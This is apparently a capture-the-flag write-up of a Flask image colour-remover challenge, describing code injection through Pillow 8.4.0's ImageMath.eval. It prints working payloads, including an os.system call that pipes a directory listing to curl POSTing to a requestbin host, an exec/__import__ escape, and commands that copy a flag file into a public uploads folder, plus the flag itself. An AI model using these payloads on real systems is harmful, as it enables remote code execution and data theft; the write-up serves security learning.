## Skills involved: Python command injection RCE, Context Escaping

I did not have previous experience with Flask, but this challenge is not that difficult.

The web application is an image color remover, taking a specified color and converting it to transparency.

Only one dependency, Pillow, has the version specified (8.4.0). That is definitely [sus](https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-2331901).

![image](https://user-images.githubusercontent.com/26480299/169521629-aee84185-c1d1-4ef6-b8af-9691a1d216aa.png)

We do have ImageMath.eval in the source code and we can throw in some payloads to the colors, which are used *directly without being parsed as integers*. (I used [Burp](https://portswigger.net/burp), which I learnt from "[TryHackMe](https://tryhackme.com/) Christmas" for this)

`os.system('ls -l | curl -X POST --data-binary @- https://requestbin.io/********')`
> name 'os' is not defined

It seemed like I could only use standard library and the specified variables, and I definitely cannot use a simple `import os` within the bracket context. It turns out that:
- we can use `exec(command)` to escape the bracket context (as suggested in the Snyk report)
- there's an inline version of import `__import__`
Both commands are available in the standard library.

So I tried:
`exec('__import__("os").system("ls -l | curl -X POST --data-binary @- https://requestbin.io/*********")')`

My domain did't catch it, perhaps the server can't make arbitrary web requests? I have to find other ways to leak the info as the RCE is most likely what I needed.

Since with RCE we can do virtually whatever we want, we can make files in the static folder, which can definitely be accessed. Here's how I approached it inside my docker container:

```
"exec('__import__(\"os\").system(\"touch pwn.txt\")')"
"exec('__import__(\"os\").system(\"pwd > pwn.txt\")')"
"exec('__import__(\"os\").system(\"pwd > application/static/uploads/pwn.txt\")')"
"exec('__import__(\"os\").system(\"ls > application/static/uploads/pwn.txt\")')"
"exec('__import__(\"os\").system(\"cat ../flag.txt > application/static/uploads/pwn.txt\")')"
```

**Flag: HTB{i_slept_my_way_to_rce}**

Remark: escaping characters in Burp was a pain.
